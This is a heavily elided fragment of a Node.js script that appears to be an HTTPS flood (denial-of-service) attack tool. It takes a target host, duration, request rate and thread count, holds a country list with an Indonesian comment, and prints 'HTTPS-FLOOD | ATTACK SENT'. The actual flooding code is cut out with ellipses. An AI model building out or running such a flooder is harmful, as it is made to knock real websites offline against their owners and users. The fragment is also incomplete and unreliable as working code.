const net = require("net");
 ...
 if (process.argv.length < 5){
    console.log(`Usage: Host time rates thread`); process.exit();}
...
// Daftar negara
var countries = ["Indonesia", "Malaysia", "Singapore", "Thailand", "Vietnam", "Philippines", "United States", "United kingdom", "Canada", "Russia", "Japan", "Myanmar", "German", "Netherlands"];
...
console.log(`HTTPS-FLOOD | ATTACK SENT`)
